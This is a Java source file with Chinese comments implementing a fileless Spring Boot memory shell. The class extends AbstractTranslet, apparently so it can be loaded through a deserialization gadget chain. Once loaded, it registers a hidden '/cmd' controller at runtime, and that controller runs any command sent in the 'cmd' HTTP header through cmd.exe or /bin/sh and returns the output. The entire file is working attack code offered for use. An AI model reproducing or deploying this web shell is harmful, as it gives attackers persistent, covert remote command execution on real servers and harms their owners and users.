package com.butler.springboot14shiro;

import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
import org.springframework.web.context.WebApplicationContext;
import org.springframework.web.context.request.RequestContextHolder;
import org.springframework.web.context.request.ServletRequestAttributes;
import org.springframework.web.servlet.mvc.condition.PatternsRequestCondition;
import org.springframework.web.servlet.mvc.condition.RequestMethodsRequestCondition;
import org.springframework.web.servlet.mvc.method.RequestMappingInfo;
import org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping;

import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.lang.reflect.Method;

public class SpringBootMemoryController extends AbstractTranslet {

    public SpringBootMemoryController() throws Exception{
        // 1. 利用spring内部方法获取context
        WebApplicationContext context = (WebApplicationContext) RequestContextHolder.currentRequestAttributes().getAttribute("org.springframework.web.servlet.DispatcherServlet.CONTEXT", 0);
        // 2. 从context中获得 RequestMappingHandlerMapping 的实例
        RequestMappingHandlerMapping mappingHandlerMapping = context.getBean(RequestMappingHandlerMapping.class);
        // 3. 通过反射获得自定义 controller 中的 Method 对象
        Method method = SpringBootMemoryController.class.getMethod("test");
        // 4. 定义访问 controller 的 URL 地址
        PatternsRequestCondition url = new PatternsRequestCondition("/cmd");
        // 5. 定义允许访问 controller 的 HTTP 方法（GET/POST）
        RequestMethodsRequestCondition ms = new RequestMethodsRequestCondition();
        // 6. 在内存中动态注册 controller
        RequestMappingInfo info = new RequestMappingInfo(url, ms, null, null, null, null, null);

        SpringBootMemoryController springBootMemoryShellOfController = new SpringBootMemoryController("aaaaaaa");
        mappingHandlerMapping.registerMapping(info, springBootMemoryShellOfController, method);
    }

    public SpringBootMemoryController(String test){

    }

    public void test() throws Exception{
        // 获取request和response对象
        HttpServletRequest request = ((ServletRequestAttributes) (RequestContextHolder.currentRequestAttributes())).getRequest();
        HttpServletResponse response = ((ServletRequestAttributes) (RequestContextHolder.currentRequestAttributes())).getResponse();
        // 获取cmd参数并执行命令
        String command = request.getHeader("cmd");
        if(command != null){
            try {
                java.io.PrintWriter printWriter = response.getWriter();
                String o = "";
                ProcessBuilder p;
                if(System.getProperty("os.name").toLowerCase().contains("win")){
                    p = new ProcessBuilder(new String[]{"cmd.exe", "/c", command});
                }else{
                    p = new ProcessBuilder(new String[]{"/bin/sh", "-c", command});
                }
                java.util.Scanner c = new java.util.Scanner(p.start().getInputStream()).useDelimiter("\\A");
                o = c.hasNext() ? c.next(): o;
                c.close();
                printWriter.write(o);
                printWriter.flush();
                printWriter.close();
            }catch (Exception ignored){

            }
        }
    }

    @Override
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {

    }

    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {

    }
}
